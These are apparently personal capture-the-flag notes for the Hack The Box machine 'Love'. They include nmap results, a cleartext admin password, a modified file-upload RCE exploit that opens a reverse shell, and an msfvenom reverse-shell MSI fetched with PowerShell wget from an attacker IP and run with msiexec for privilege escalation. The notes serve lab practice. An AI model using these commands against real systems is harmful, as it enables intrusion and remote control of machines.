----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Love
# 11/4/2023
10.10.10.239

----------------------------------------------------
# creds
----------------------------------------------------
 admin : @LoveIsInTheAir!!!!

----------------------------------------------------
# nmap
----------------------------------------------------
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql?
5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)


----------------------------------------------------
# foothold
----------------------------------------------------
sudo nano /etc/nano
echo "10.10.10.239 www.love.htb staging.love.htb" >> /etc/hosts

www.love.htb

└─$ searchsploit voting system
Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)         | php/webapps/49445.py


 staging.love.htb

 http://staging.love.htb/beta.php

 By trying to visit the www.love.htb:5000 we notice though the following message:
You don't have permission to access this resource .

However, if we manage to reach http://127.0.0.1:5000/ we can view what is running internally.
Now it is also possible to extract passwords for the OMRS as shown below, via port 5000.


Vote Admin Creds admin: @LoveIsInTheAir!!!! 

modify exploit


# --- Edit your settings here ----
IP = "www.love.htb" # Website's URL
USERNAME = "admin" #Auth username
PASSWORD = "@LoveIsInTheAir!!!!" # Auth Password
REV_IP = "10.10.14.18" # Reverse shell IP
REV_PORT = "8888" # Reverse port
# --------------------------------
INDEX_PAGE = f"http://{IP}/admin/index.php"
LOGIN_URL = f"http://{IP}/admin/login.php"
VOTE_URL = f"http://{IP}/admin/voters_add.php"
CALL_SHELL = f"http://{IP}/images/shell.php"


└─$ nc -lvnp 8888

└─$ python3 49445.py


----------------------------------------------------
# Privilege Escalation
----------------------------------------------------
 msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.16.2 LPORT=9001 -f msi -o rev.msi

 powershell wget http://10.10.16.2/rev.msi -outfile rev.msi

 C:\ProgramData> powershell wget http://10.10.16.2/rev.msi -outfile rev.msi

└─$ rlwrap nc -lvnp 9001 

C:\ProgramData>msiexec /quiet /qn /i rev.msi
 got a root
 